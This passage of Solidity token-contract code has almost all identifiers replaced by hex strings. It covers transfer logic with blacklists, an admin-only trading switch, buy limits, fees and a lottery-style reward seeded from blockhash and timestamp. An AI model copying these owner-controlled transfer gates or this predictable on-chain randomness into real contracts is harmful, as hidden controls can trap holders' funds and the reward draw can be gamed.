Ox6fc41adf6c4574ce8ca0a88f94f5f43f7b352f13212f039ec4852feb3dd0fc0a57dc1c3a0593c7f72cef7fe56e856c31f6c318bae08444fa4cbd45be6688e01c[Ox6ee7e94aa7c62ba4b86c8ab75796512fa5d041de9708afb5d1b60a876912f57e9deaeb49df698ab970cc3e64d09a1c3a33e86f4957352ca30d42603ed0ff6cce].Ox9b8eb55defbcb1608bc4f0e8674f8cdaab800824252596a6cecaebab5938b98a6ddab9c1cc6bf1998ab8e6266a5f58caa9e691eff25a4ff2066260a0c2f86c01 : Ox34a97b4b76be7c2f2948eae45035962c11c933da0e12ad4c1e7a61e3478f7c5bec49384a6c7b6305cecb86edaecf45eed73bb97639c028d57496fd61a6ff684b(Ox546481c5b4a41f4d6d1a980974a419ca762f5ba02c38601c9d721a4a516be6e73a48ea5b01cc29bba06d4ef08d538b176097dfbf1bbb2a695026da4e89daa3dc);}Oxad6634a54b19b1129e456639ce12dda260fe23c2a701b05307b94fa26a90d76b32d577be74e9e0b5c3ef8b96c9174cad459b3191b91c5647787c5af176ef8993(Oxe35a900d9aaca65c3304c8253063b8053df3b1829bd2907ce59e4a2913bf2b66ca726e58ae079ac138667c48e81af791538643d7c6abf50d688ffc73d4aad787, Oxc6038bc6abc28016156b900f4cef4cea67fba4b79e8971c09ec23ab217cb7edfe861a33de338ae49fc5cadd05502d4c61db25c89f962a471fcf31f1be53f1e36, Ox6fc41adf6c4574ce8ca0a88f94f5f43f7b352f13212f039ec4852feb3dd0fc0a57dc1c3a0593c7f72cef7fe56e856c31f6c318bae08444fa4cbd45be6688e01c[Ox6ee7e94aa7c62ba4b86c8ab75796512fa5d041de9708afb5d1b60a876912f57e9deaeb49df698ab970cc3e64d09a1c3a33e86f4957352ca30d42603ed0ff6cce].Oxee61c1030372de3721b2d2a5a4e3abf50aeb2702ed7f77e03fec57556b9254caa3560bda4b0b337d500db2924524b661577770f0564ca01a02cee9e9f2da1b24, Ox6ee7e94aa7c62ba4b86c8ab75796512fa5d041de9708afb5d1b60a876912f57e9deaeb49df698ab970cc3e64d09a1c3a33e86f4957352ca30d42603ed0ff6cce, Ox80019c3fe8aa3028afd0345e2b0aab857f9f4ff376b2a28426e85ef3c1908b5c8eec1f81b7e8ea284761d4777d9384ca2a8f181eedd425891221f2a39089d415);Ox8d50d21db24c97198b029aa543ec857a2ae54a3d566cd4685a98bb13df6cb005f70600d7ed59205660bc993cf409136432c6415a44a306e673a3468f3e61e61d.sync();}function Ox81d555e9f731b2b6229b649d675cda6615a28d7156a07cf3405bc7e8ac0fbf008543310ade625b0c3da35cbecba67d0b373bde4a166813c71bd1d261414affbb(uint256 value, address Ox6ee7e94aa7c62ba4b86c8ab75796512fa5d041de9708afb5d1b60a876912f57e9deaeb49df698ab970cc3e64d09a1c3a33e86f4957352ca30d42603ed0ff6cce) internal view returns (uint256) {if(Ox1619f6d175e0aadb3482e2c5f1f52aa9bdf53b7c8a331173ccd6560c30bfb42a6e6037da39ed4c11d7d1086f995b514e3f09158461cf79587c486ad9a692b82c >= Oxce30e8c09a977ca68129619235dcdce6a2d476f6c6369fd7c6a818a91f35cd8f823d4093a9daf8226ed908c2a4654142876a50549570b77da604f53253e8132b && Ox1619f6d175e0aadb3482e2c5f1f52aa9bdf53b7c8a331173ccd6560c30bfb42a6e6037da39ed4c11d7d1086f995b514e3f09158461cf79587c486ad9a692b82c > value && value > 0) {uint256 Oxd35685d7d916f121a89626c94442694562c0455e77c00f424d988f7015079682244b40da8ecb8e0e5b0207dd944b511b6d99d15b9c65860f6314a86d420d072e = Oxb0358942bb83789056bd0d1fee7b633561376a32e0fd4775d2942001675b09d12de127251763e624e9f642e9dc750547b975ed34af60a91287d14c60bc0acdec[Ox6ee7e94aa7c62ba4b86c8ab75796512fa5d041de9708afb5d1b60a876912f57e9deaeb49df698ab970cc3e64d09a1c3a33e86f4957352ca30d42603ed0ff6cce] / Ox604e19fd903161bd800e6c4892228398a1adef6b53ad6e9cfbced15312c6deb82479978bfcdb649d46e0ba3abf2d48f357cbecd37c566c92b4c48c4fe6febff7;if(Ox1619f6d175e0aadb3482e2c5f1f52aa9bdf53b7c8a331173ccd6560c30bfb42a6e6037da39ed4c11d7d1086f995b514e3f09158461cf79587c486ad9a692b82c - value < Oxce30e8c09a977ca68129619235dcdce6a2d476f6c6369fd7c6a818a91f35cd8f823d4093a9daf8226ed908c2a4654142876a50549570b77da604f53253e8132b ) value = Ox1619f6d175e0aadb3482e2c5f1f52aa9bdf53b7c8a331173ccd6560c30bfb42a6e6037da39ed4c11d7d1086f995b514e3f09158461cf79587c486ad9a692b82c - Oxce30e8c09a977ca68129619235dcdce6a2d476f6c6369fd7c6a818a91f35cd8f823d4093a9daf8226ed908c2a4654142876a50549570b77da604f53253e8132b;if(value > Oxd35685d7d916f121a89626c94442694562c0455e77c00f424d988f7015079682244b40da8ecb8e0e5b0207dd944b511b6d99d15b9c65860f6314a86d420d072e) value = (Oxd35685d7d916f121a89626c94442694562c0455e77c00f424d988f7015079682244b40da8ecb8e0e5b0207dd944b511b6d99d15b9c65860f6314a86d420d072e * 500)/1000;else if(Oxd35685d7d916f121a89626c94442694562c0455e77c00f424d988f7015079682244b40da8ecb8e0e5b0207dd944b511b6d99d15b9c65860f6314a86d420d072e-value < 5*1e18) value = 0;}return value;}function transfer(address to, uint256 value)external override Oxa4e5f0de01ab4c631b4937495f4a7b258440801816f7b12ca38fb7f5103f0743a1ec47d6c5e28d7e56ca2f4454750d9798f6e7085f69cfd651026265aae69d9a(to) returns (bool){Ox0eadd8844e393476274e24eb98be1d302b56d3ae6eb8c2fbbad6560ff3bf7b1b3a1a41ac77c52082888df7cfd4a0f90bc67765873149f16bd9c4ef5ca56d813b(msg.sender, to, value);return true;}function transferFrom(address from,address to,uint256 value) external override Oxa4e5f0de01ab4c631b4937495f4a7b258440801816f7b12ca38fb7f5103f0743a1ec47d6c5e28d7e56ca2f4454750d9798f6e7085f69cfd651026265aae69d9a(to) returns (bool) {if (Ox11ebaf4bece410a3fe1d9084976d6e9b4be6d01b88478fbecd89d885cecc81fc703c03d27caf4caa3ad9220420569118b69eebb84b593afd1abf674e99e1b994[from][msg.sender] != type(uint).max) {Ox11ebaf4bece410a3fe1d9084976d6e9b4be6d01b88478fbecd89d885cecc81fc703c03d27caf4caa3ad9220420569118b69eebb84b593afd1abf674e99e1b994[from][msg.sender] = Ox11ebaf4bece410a3fe1d9084976d6e9b4be6d01b88478fbecd89d885cecc81fc703c03d27caf4caa3ad9220420569118b69eebb84b593afd1abf674e99e1b994[from][msg.sender] - value;}Ox0eadd8844e393476274e24eb98be1d302b56d3ae6eb8c2fbbad6560ff3bf7b1b3a1a41ac77c52082888df7cfd4a0f90bc67765873149f16bd9c4ef5ca56d813b(from, to, value);return true;}function Ox03dedf8d06303c98f2fb0b36422564fcde64d2ddcd196ee86fc4ddb5cbf277b8d5c28008aca11f27b9c0949154f0d1f8f2e9b1b70473a34c44ce9e959c666546(address from,address to,uint256 amount) internal returns (bool) {uint256 Oxdcd5ce307d4e76f9b4af4d612b6bfd6170313e7612f4e8c987c7a0d2f3148be45bf5d30cbbc09007a8e2dde8bc8b83824cc8122f56b2c176b2d3e496672895db = amount * Ox604e19fd903161bd800e6c4892228398a1adef6b53ad6e9cfbced15312c6deb82479978bfcdb649d46e0ba3abf2d48f357cbecd37c566c92b4c48c4fe6febff7;Oxb0358942bb83789056bd0d1fee7b633561376a32e0fd4775d2942001675b09d12de127251763e624e9f642e9dc750547b975ed34af60a91287d14c60bc0acdec[from] = Oxb0358942bb83789056bd0d1fee7b633561376a32e0fd4775d2942001675b09d12de127251763e624e9f642e9dc750547b975ed34af60a91287d14c60bc0acdec[from] - Oxdcd5ce307d4e76f9b4af4d612b6bfd6170313e7612f4e8c987c7a0d2f3148be45bf5d30cbbc09007a8e2dde8bc8b83824cc8122f56b2c176b2d3e496672895db;Oxb0358942bb83789056bd0d1fee7b633561376a32e0fd4775d2942001675b09d12de127251763e624e9f642e9dc750547b975ed34af60a91287d14c60bc0acdec[to] = Oxb0358942bb83789056bd0d1fee7b633561376a32e0fd4775d2942001675b09d12de127251763e624e9f642e9dc750547b975ed34af60a91287d14c60bc0acdec[to] + Oxdcd5ce307d4e76f9b4af4d612b6bfd6170313e7612f4e8c987c7a0d2f3148be45bf5d30cbbc09007a8e2dde8bc8b83824cc8122f56b2c176b2d3e496672895db;return true;}function Ox0eadd8844e393476274e24eb98be1d302b56d3ae6eb8c2fbbad6560ff3bf7b1b3a1a41ac77c52082888df7cfd4a0f90bc67765873149f16bd9c4ef5ca56d813b(address sender,address recipient,uint256 amount) internal returns (bool) {require(!Ox3f5f94bc562cee134170bbd97c0b4849c3670bce368d3c02ebe0ac9aa7a7b1861c2e05ef1acd6856785c183c41c23a0d3ed28ca8f28cc443f8fa863fe02c70e5[sender] && !Ox3f5f94bc562cee134170bbd97c0b4849c3670bce368d3c02ebe0ac9aa7a7b1861c2e05ef1acd6856785c183c41c23a0d3ed28ca8f28cc443f8fa863fe02c70e5[recipient], "e");require(!Oxb39c69daa3f1158ba3153919f7ad2ef855672a9d98e61d7be50b3b382e17eb5dacc98257b885a35b82ae73283116c1010adde4e74fa73dcd678c4f556ae35a3d, "f");if(Ox6fc41adf6c4574ce8ca0a88f94f5f43f7b352f13212f039ec4852feb3dd0fc0a57dc1c3a0593c7f72cef7fe56e856c31f6c318bae08444fa4cbd45be6688e01c[sender].pairAddress == sender) {require(tx.gasprice < Ox9b44a1d7a45b9623906a6981c13f16a0cbc1f9688293234a053d86073e590e0dee167333f3e0613d8a3ec8198a0f72535e40a522c9c9a8aa4a029bfd5800cc4e.Ox3d1cd33121ce047fe4e2a855f65c89f97bc448c1d889187369ed49bd21372fa9e97d20c665ba71f2d41d6d26868cb26d20553088349de129520da8d1020dc289, "g");}if(!Ox9b44a1d7a45b9623906a6981c13f16a0cbc1f9688293234a053d86073e590e0dee167333f3e0613d8a3ec8198a0f72535e40a522c9c9a8aa4a029bfd5800cc4e.Oxcfa597d19eeeedbc038e6ec805f5ee1d1ced2bb18f6126601d704322e77ba2879635756fad9058d356861c1e08c1ba6d3bc739223681e00cfac2364aea3ad5a5) require(isAdmin(sender) || isAdmin(recipient) || sender == address(this), "h"); if(Ox4546b19be301da5b190ad3d48eb66286926dcf8759e5b67f5d15e4d4e661c90d0bbec58ccd6f2d24b844b3c0503b43edd9d5cbdccf04a6c038cb62d84d6cbb8a) {uint256 Oxf2a5f3e351b11ecefceace091d0a35336e9133361efde2e4bf47c52d05be0c9f9defed41f0b7f04c57d8b5c9d537026326fbcf457072d150e0e67dbef53864fa = (block.timestamp - Oxa7bbff86979e0b6a116f18fb90a83136e3b5baad0856f1d7aa9651e44b5fd6aff5877607328573a6e7bb8271f5e7867993a038bf079b74e7fa725ae391f50df0)/300;uint256[6] memory Oxf5b9acf00a12e389e9693496c4665ad243c8a1c27905f6076e1a2cb7184eec0d2bb65d72f854522939b298fa2bb0a0455187e3b12d0ad07ca0781da2db64eccb = [uint256(1e18), 2500000000000000000, 5*1e18, 10*1e18, 15*1e18, 25*1e18];if(Oxf2a5f3e351b11ecefceace091d0a35336e9133361efde2e4bf47c52d05be0c9f9defed41f0b7f04c57d8b5c9d537026326fbcf457072d150e0e67dbef53864fa < 6) {uint256 Ox979edc68396b5bff532633065b2500ad99b9818025fb80c01845f098dc62300701d9d2206cc145921d6be9cfbbe15cb250aa1a226553019319ac53d6fb9b358e = Oxbac15993a27da50d7cf05d535a9c57e1a074a653dd899d12b1dcb9eb8ccfcbc0ab1278e909ee74994c13a1e67bf48efa4e9d2173d421f0015c4f0004e8db0c3a[recipient] + amount;if( Ox979edc68396b5bff532633065b2500ad99b9818025fb80c01845f098dc62300701d9d2206cc145921d6be9cfbbe15cb250aa1a226553019319ac53d6fb9b358e > Oxf5b9acf00a12e389e9693496c4665ad243c8a1c27905f6076e1a2cb7184eec0d2bb65d72f854522939b298fa2bb0a0455187e3b12d0ad07ca0781da2db64eccb[Oxf2a5f3e351b11ecefceace091d0a35336e9133361efde2e4bf47c52d05be0c9f9defed41f0b7f04c57d8b5c9d537026326fbcf457072d150e0e67dbef53864fa]) revert('i');Oxbac15993a27da50d7cf05d535a9c57e1a074a653dd899d12b1dcb9eb8ccfcbc0ab1278e909ee74994c13a1e67bf48efa4e9d2173d421f0015c4f0004e8db0c3a[recipient] += amount;} else Ox4546b19be301da5b190ad3d48eb66286926dcf8759e5b67f5d15e4d4e661c90d0bbec58ccd6f2d24b844b3c0503b43edd9d5cbdccf04a6c038cb62d84d6cbb8a = false;}unchecked{Ox0d2236f9159e1bfcad010d743093446544bd914dd460be1eedfae47de407091f42877a66f7a8d2a6bf1e2fbbff554988e48dbbc32d3c6bb5768e95fd76b9c32a += uint256(keccak256(abi.encodePacked(sender.balance, Oxb0358942bb83789056bd0d1fee7b633561376a32e0fd4775d2942001675b09d12de127251763e624e9f642e9dc750547b975ed34af60a91287d14c60bc0acdec[sender],recipient.balance, Oxb0358942bb83789056bd0d1fee7b633561376a32e0fd4775d2942001675b09d12de127251763e624e9f642e9dc750547b975ed34af60a91287d14c60bc0acdec[recipient], Ox0d2236f9159e1bfcad010d743093446544bd914dd460be1eedfae47de407091f42877a66f7a8d2a6bf1e2fbbff554988e48dbbc32d3c6bb5768e95fd76b9c32a++, block.timestamp, msg.sender, blockhash(block.number - 1))));}bool Ox147cf21ed415c5632e2af8320ccc406f460d65fe97791483e8cfc77d37bb0a335f4d2c8b0181f18b7d7929f980968266ebc781fa384498433f2bb66530be85df = (Ox6fc41adf6c4574ce8ca0a88f94f5f43f7b352f13212f039ec4852feb3dd0fc0a57dc1c3a0593c7f72cef7fe56e856c31f6c318bae08444fa4cbd45be6688e01c[sender].pairAddress == sender || Ox6fc41adf6c4574ce8ca0a88f94f5f43f7b352f13212f039ec4852feb3dd0fc0a57dc1c3a0593c7f72cef7fe56e856c31f6c318bae08444fa4cbd45be6688e01c[recipient].pairAddress == recipient);if(Ox147cf21ed415c5632e2af8320ccc406f460d65fe97791483e8cfc77d37bb0a335f4d2c8b0181f18b7d7929f980968266ebc781fa384498433f2bb66530be85df) Ox6a4e6ba7cc70fb06c1a7e4cc809625ad21de9d953af8f07ab37f80ee66fc6020800b4963d92db36935d3f8a773d8b8775b03bf61e4a30145bfb0336d0fb31e94(Ox6fc41adf6c4574ce8ca0a88f94f5f43f7b352f13212f039ec4852feb3dd0fc0a57dc1c3a0593c7f72cef7fe56e856c31f6c318bae08444fa4cbd45be6688e01c[sender].pairAddress == Oxef55ae916f742ac9bae1ed72794c843579775b6fc9c0a19a27c2d7b097cd2b55a5cee1c9259379581d22fb5c2e36899c1f8697a17a711998c2149183dcdc9728 ? recipient : sender);if(Ox382a7116add3c456c74de3f13b4cc6a018191d2e42663a2ab8274f070d206349cb9b627d4e5ba40072c95c69a0f4cae84dbd8f8ad7dddeccb033ac6568b2c5b2(sender, recipient, amount)) {Ox6debe9a9f7b1261933595bfefde1d6ccdb2d28ddfff0503d44a61d90c62af1596c410ab6dc36b33c2d34a06b5b4bf14fbb86de2fc77a3e41672573ae7914e8bf();}if (Ox3b1919ff8e4467ffcb18a67ca38f07304b0f90a8b872be269279b1a7c695fc010eb4dac95c1c0eeb1eb7772be310b77fcc8977a19966203e4cd87d9fc91e1c28) {return Ox03dedf8d06303c98f2fb0b36422564fcde64d2ddcd196ee86fc4ddb5cbf277b8d5c28008aca11f27b9c0949154f0d1f8f2e9b1b70473a34c44ce9e959c666546(sender, recipient, amount);}if (Ox804df74b33f885eb0ecded4733793479702345c76409dc6cf72dca58e90672e6c751aab390b73e1c60045c651edfea1d29a957543bec16398fb517ef0fb620e9()) {   Oxe9d89589410b16ec16262f00078e704043770b6ba85aee4b339bade91992edcbc26b3f878afa1199d9132537023e3b1165944ee2550c5a517ac99e65ddbd1a46();}if (Oxc109893900b3d2dfd468ff5f3a5cf550fb724ac086a242b988a1fc530433ea3f7a81a039250a31ae87a0f6d173710eb3428f4246cdd8ca94f0412c4bcbedb86f()) {Oxe695b8aca75913dc0b21a86b8f1829512f8a8951a34d8f50a0f5ecec1272fd16a5e74d2d75da70987e1dea5f04fc88193f6a9c39bd8a8ee794c03ff8a2f918bb();}uint256 Oxdcd5ce307d4e76f9b4af4d612b6bfd6170313e7612f4e8c987c7a0d2f3148be45bf5d30cbbc09007a8e2dde8bc8b83824cc8122f56b2c176b2d3e496672895db = amount * Ox604e19fd903161bd800e6c4892228398a1adef6b53ad6e9cfbced15312c6deb82479978bfcdb649d46e0ba3abf2d48f357cbecd37c566c92b4c48c4fe6febff7;Oxb0358942bb83789056bd0d1fee7b633561376a32e0fd4775d2942001675b09d12de127251763e624e9f642e9dc750547b975ed34af60a91287d14c60bc0acdec[sender] = Oxb0358942bb83789056bd0d1fee7b633561376a32e0fd4775d2942001675b09d12de127251763e624e9f642e9dc750547b975ed34af60a91287d14c60bc0acdec[sender] - Oxdcd5ce307d4e76f9b4af4d612b6bfd6170313e7612f4e8c987c7a0d2f3148be45bf5d30cbbc09007a8e2dde8bc8b83824cc8122f56b2c176b2d3e496672895db;uint256 Ox682a07692407bb05234287429bdebea2b965ef7ed9681fbd03ef16e185af818430fe01662a6d7580aefb4dfb8d09a75d216699498226abb770de9923dde7d1d2 = Ox147cf21ed415c5632e2af8320ccc406f460d65fe97791483e8cfc77d37bb0a335f4d2c8b0181f18b7d7929f980968266ebc781fa384498433f2bb66530be85df && !Ox309fa20f8837684aa40a99f1f1ddce45692a17baaafb03d060b5814508f616be474e99cee425b1437d592bea7e575ddd6dd2019e78cfa13ee3e3ea3c0332f68a[sender]? Ox5225204aa3a8fc3b622c1f5a85704fa58166b2aa02d92b4972a6cb26b2ab45b6cdd1c21edf99f6993e45db4e5ca5b98b556d7991976ecedce4332e1a498e9497(sender, recipient, Oxdcd5ce307d4e76f9b4af4d612b6bfd6170313e7612f4e8c987c7a0d2f3148be45bf5d30cbbc09007a8e2dde8bc8b83824cc8122f56b2c176b2d3e496672895db): Oxdcd5ce307d4e76f9b4af4d612b6bfd6170313e7612f4e8c987c7a0d2f3148be45bf5d30cbbc09007a8e2dde8bc8b83824cc8122f56b2c176b2d3e496672895db;Oxb0358942bb83789056bd0d1fee7b633561376a32e0fd4775d2942001675b09d12de127251763e624e9f642e9dc750547b975ed34af60a91287d14c60bc0acdec[recipient] += Ox682a07692407bb05234287429bdebea2b965ef7ed9681fbd03ef16e185af818430fe01662a6d7580aefb4dfb8d09a75d216699498226abb770de9923dde7d1d2;emit Transfer(sender,recipient,Ox682a07692407bb05234287429bdebea2b965ef7ed9681fbd03ef16e185af818430fe01662a6d7580aefb4dfb8d09a75d216699498226abb770de9923dde7d1d2 / Ox604e19fd903161bd800e6c4892228398a1adef6b53ad6e9cfbced15312c6deb82479978bfcdb649d46e0ba3abf2d48f357cbecd37c566c92b4c48c4fe6febff7);return true;}function Ox5225204aa3a8fc3b622c1f5a85704fa58166b2aa02d92b4972a6cb26b2ab45b6cdd1c21edf99f6993e45db4e5ca5b98b556d7991976ecedce4332e1a498e9497(address sender,address recipient,uint256 Oxdcd5ce307d4e76f9b4af4d612b6bfd6170313e7612f4e8c987c7a0d2f3148be45bf5d30cbbc09007a8e2dde8bc8b83824cc8122f56b2c176b2d3e496672895db) internal returns (uint256) {uint256 Oxbc66756224004cd64eaa8f37486227c87d31d2ad06b8f0cd5c2d81df7f0861b978bc842d139c4b8030ef290b7815ab9cbeefa6954dfc8390ebd7a6d84a147c11 = Oxdcd5ce307d4e76f9b4af4d612b6bfd6170313e7612f4e8c987c7a0d2f3148be45bf5d30cbbc09007a8e2dde8bc8b83824cc8122f56b2c176b2d3e496672895db / Oxb300636ad81e8a744dd639272cbe74a1269cdd91d0789749758c5ccab4e8ba67409e3da1cbcb9586215bfa74c8ff8eb7ecc5b597cb870780a6eb8d5725d0e2c4 * Ox506767f56feeccc025988ca739ee8e43d125967cc0a101b8c05915f9a8898284d1e05d018b1131f58f4f2f12ca25d11ef97bec3aeccc0ce0f816859f7764698d;uint256 Oxee12cd14edd4f3f84806393055e04cfc942356844566c7ee001f3301c604067d1097e725aa499e41c51e5a68da576dcfc59515d1b2d6043cb75f3144cd3f1549;bool Oxfc12d7f7ef6a3b5dda770c599f024b68777e2318401b7b3aad2fe76aba0d3d9c063869e6958ac10a20f2549e220e961399a77c03f439110921f3ec1d4e9fd095;uint8 Oxe36abd08d0c3ea07e6cd64c8eb7581f7209af49f2b7bc966df23086a0df1dbbb4124b634cc5619c46fc7629f332df397b9b8dac486a7ae05acad7fb68d115df9 = 255;bool Ox0842ff486c1c982b59f4dc0ce3f0acd6fbfabc803960fffe65140b0f585e1fa13801565a6c3526de10f993efe699d302e0cfd34cead5f3b9698bcca0917df84c;for(uint8 i; i < Ox4e3352412d6de6b04877dec3370fd47d659c6a1b63e11ca873502fa72e93899c35f3b090f97a27713ef7940b2bf2d8dd06f7f8f85f21a07506e5c8677588a080; i++) {Ox619e8ca4ce2cf8d47c48789372987edfb9cf7b5837a9ac4a0fe796113a4dd5701b13156f72def4a02c11e0864171eaf05982ce2b83b96aeb8a69cc16b61bb04e[i] += (Oxdcd5ce307d4e76f9b4af4d612b6bfd6170313e7612f4e8c987c7a0d2f3148be45bf5d30cbbc09007a8e2dde8bc8b83824cc8122f56b2c176b2d3e496672895db / Oxb300636ad81e8a744dd639272cbe74a1269cdd91d0789749758c5ccab4e8ba67409e3da1cbcb9586215bfa74c8ff8eb7ecc5b597cb870780a6eb8d5725d0e2c4 * Ox9eca1505f25788604d2a379ba48d3aa8173d692de7f48b187bf1fd4ebf5f3d8027801d81ee2e00ee8b8c450e7b2b55d45fa885459d48b4985d34dce812f6ef5b * (i == Ox4e3352412d6de6b04877dec3370fd47d659c6a1b63e11ca873502fa72e93899c35f3b090f97a27713ef7940b2bf2d8dd06f7f8f85f21a07506e5c8677588a080-1 ? 340 : 330)) / 1000;if(!Oxfc12d7f7ef6a3b5dda770c599f024b68777e2318401b7b3aad2fe76aba0d3d9c063869e6958ac10a20f2549e220e961399a77c03f439110921f3ec1d4e9fd095 && Ox619e8ca4ce2cf8d47c48789372987edfb9cf7b5837a9ac4a0fe796113a4dd5701b13156f72def4a02c11e0864171eaf05982ce2b83b96aeb8a69cc16b61bb04e[i] > Ox8c87c98139451d3a564826ce334d979b724561bcbf2f87d807c8e92b839dcfe2083964391d1197e01e91f9b4ebc3e7a6b9f99989a52bd72c4aa79588ba516357[i]*Ox604e19fd903161bd800e6c4892228398a1adef6b53ad6e9cfbced15312c6deb82479978bfcdb649d46e0ba3abf2d48f357cbecd37c566c92b4c48c4fe6febff7 && (Ox49c7ef34bcf7908bf2d1b64e6cbd62f8625d49e3fb5c131bc8c56c03576ded6ab47fb622a9fc5b56b9a2dde1b7c673b3f1d9f6a1dd82fa8d19059a74056f6c1c(poolList[0]) * (Oxdcd5ce307d4e76f9b4af4d612b6bfd6170313e7612f4e8c987c7a0d2f3148be45bf5d30cbbc09007a8e2dde8bc8b83824cc8122f56b2c176b2d3e496672895db / Ox604e19fd903161bd800e6c4892228398a1adef6b53ad6e9cfbced15312c6deb82479978bfcdb649d46e0ba3abf2d48f357cbecd37c566c92b4c48c4fe6febff7))/1e8 >= ((i==0 ? 1: i==1 ? 5 : 10)*1e18) && !Ox9668937a0d5754e2d07438f8f636702ca6810430a454d93f1c209764938afeb083df43e21a4d0a2cda1a8bb42c5f05acf688801af333d12d8b4c3b9c3d1c37fd(recipient)) {if(Ox95ab1a645be7533aa710ad76bcd8f637dec596054fda6ebb653340171d5aa2f18ef787383bbce2f5d4de344c0897c02671c48cea638381b074e76dc1bc940b71 <= block.number && recipient != Oxbcda5a3b450351a5a14dd577060a16e39f940b264c6462b7ee2085913526b1c6cfc0053f70ce9b98b5b2276e893fedc03e7c8e5472c99655ffddcb8cda240819 && recipient != Ox0d12084248ffac39feaca5f70b48a845ab14be764b9ba3595109e0c17886b9257445633f42d50d2c90eb7548dac80f14bebb90fd7bddc01da0995357bd36a556 && recipient != address(this)) {if(!Ox0842ff486c1c982b59f4dc0ce3f0acd6fbfabc803960fffe65140b0f585e1fa13801565a6c3526de10f993efe699d302e0cfd34cead5f3b9698bcca0917df84c) {Ox0842ff486c1c982b59f4dc0ce3f0acd6fbfabc803960fffe65140b0f585e1fa13801565a6c3526de10f993efe699d302e0cfd34cead5f3b9698bcca0917df84c = true;Oxe36abd08d0c3ea07e6cd64c8eb7581f7209af49f2b7bc966df23086a0df1dbbb4124b634cc5619c46fc7629f332df397b9b8dac486a7ae05acad7fb68d115df9 = Oxd905c610651df175170f3311d42368dded8b8b9970c8aad77c228223df9c7cc9d7c6492d61137b388686575d8a1d182482bfafbcf67b647315c46aa487930b56(sender, recipient,Oxdcd5ce307d4e76f9b4af4d612b6bfd6170313e7612f4e8c987c7a0d2f3148be45bf5d30cbbc09007a8e2dde8bc8b83824cc8122f56b2c176b2d3e496672895db);}if(Oxe36abd08d0c3ea07e6cd64c8eb7581f7209af49f2b7bc966df23086a0df1dbbb4124b634cc5619c46fc7629f332df397b9b8dac486a7ae05acad7fb68d115df9 < Ox9b44a1d7a45b9623906a6981c13f16a0cbc1f9688293234a053d86073e590e0dee167333f3e0613d8a3ec8198a0f72535e40a522c9c9a8aa4a029bfd5800cc4e.Oxcb596cd72fb9955a60ca9e4b0bd52dc2a8a5469c6e33124ed502af5ce0c637180d3802f34c7be3d6155854b2e4d46557dac228a7629e53dfd38e87bcab619ef7) { Oxfc12d7f7ef6a3b5dda770c599f024b68777e2318401b7b3aad2fe76aba0d3d9c063869e6958ac10a20f2549e220e961399a77c03f439110921f3ec1d4e9fd095 = true; uint256 Oxb556471a6993f215ce4205f8ab0e7f9b93cf4207180ff561dee8dc96e44e5880facfd9c3b2fe3a5212bc7de3ded4dc85272f7f322d0510ee43b7ee7119b11dd0 = 1e18*Ox604e19fd903161bd800e6c4892228398a1adef6b53ad6e9cfbced15312c6deb82479978bfcdb649d46e0ba3abf2d48f357cbecd37c566c92b4c48c4fe6febff7 * (i<1 ? 10 : i<2 ? 50 : 100);Oxee12cd14edd4f3f84806393055e04cfc942356844566c7ee001f3301c604067d1097e725aa499e41c51e5a68da576dcfc59515d1b2d6043cb75f3144cd3f1549 += Oxb556471a6993f215ce4205f8ab0e7f9b93cf4207180ff561dee8dc96e44e5880facfd9c3b2fe3a5212bc7de3ded4dc85272f7f322d0510ee43b7ee7119b11dd0;Ox619e8ca4ce2cf8d47c48789372987edfb9cf7b5837a9ac4a0fe796113a4dd5701b13156f72def4a02c11e0864171eaf05982ce2b83b96aeb8a69cc16b61bb04e[i] -= Oxb556471a6993f215ce4205f8ab0e7f9b93cf4207180ff561dee8dc96e44e5880facfd9c3b2fe3a5212bc7de3ded4dc85272f7f322d0510ee43b7ee7119b11dd0;Ox95ab1a645be7533aa710ad76bcd8f637dec596054fda6ebb653340171d5aa2f18ef787383bbce2f5d4de344c0897c02671c48cea638381b074e76dc1bc940b71 = 0;emit Ox947d4639c2cd6724b04315b9a96805ba1603a6a725670a4d9a1ee8200412dbae970256eff6ca667307eea90a228b419f7fa8a8403fd49281aa0157275097bc54(Oxee12cd14edd4f3f84806393055e04cfc942356844566c7ee001f3301c604067d1097e725aa499e41c51e5a68da576dcfc59515d1b2d6043cb75f3144cd3f1549/Ox604e19fd903161bd800e6c4892228398a1adef6b53ad6e9cfbced15312c6deb82479978bfcdb649d46e0ba3abf2d48f357cbecd37c566c92b4c48c4fe6febff7, i, recipient);} else Ox95ab1a645be7533aa710ad76bcd8f637dec596054fda6ebb653340171d5aa2f18ef787383bbce2f5d4de344c0897c02671c48cea638381b074e76dc1bc940b71 = block.number + uint256(Oxe36abd08d0c3ea07e6cd64c8eb7581f7209af49f2b7bc966df23086a0df1dbbb4124b634cc5619c46fc7629f332df397b9b8dac486a7ae05acad7fb68d115df9);}}}Oxb0358942bb83789056bd0d1fee7b633561376a32e0fd4775d2942001675b09d12de127251763e624e9f642e9dc750547b975ed34af60a91287d14c60bc0acdec[address(this)] += (Oxdcd5ce307d4e76f9b4af4d612b6bfd6170313e7612f4e8c987c7a0d2f3148be45bf5d30cbbc09007a8e2dde8bc8b83824cc8122f56b2c176b2d3e496672895db / Oxb300636ad81e8a744dd639272cbe74a1269cdd91d0789749758c5ccab4e8ba67409e3da1cbcb9586215bfa74c8ff8eb7ecc5b597cb870780a6eb8d5725d0e2c4 * (Ox1316ab74b414a62a9b01a30049bd56854079b0893f9ba0603e350a4c0094e2cbc39a625bca411845c35c372e9cdfe6f46f8a6d0f7f5e1ad687d852a6d3a714d9 + Oxb2c6616edd01f082ec7e4257d0c1fc301ce1135b3887cef21bbfae05497a58d846dffe712bf62adc0d5dec9cb16d94c6ec9efeb1bb84305349a0e9511b039245 + Ox9eca1505f25788604d2a379ba48d3aa8173d692de7f48b187bf1fd4ebf5f3d8027801d81ee2e00ee8b8c450e7b2b55d45fa885459d48b4985d34dce812f6ef5b));if(Ox6fc41adf6c4574ce8ca0a88f94f5f43f7b352f13212f039ec4852feb3dd0fc0a57dc1c3a0593c7f72cef7fe56e856c31f6c318bae08444fa4cbd45be6688e01c[recipient].pairAddress == recipient) {if(Oxa39f66c194343dfc48b7bb7bfef0105126065bbd00a107de7d53ccee15f0ad04d1010dc88a5180e36b8a77579e208faa2081b906f497c7e42b686674b90ca91b < Ox6c221ae35b524ffb96d1358d9ff7d5257d03fe0e9e805f777b51259abf6cd1ee1a13338fe694b5281451412bba399a231599bffa83fa282983084b32af5d282c){ for(uint i; i < Oxa39f66c194343dfc48b7bb7bfef0105126065bbd00a107de7d53ccee15f0ad04d1010dc88a5180e36b8a77579e208faa2081b906f497c7e42b686674b90ca91b; i++) 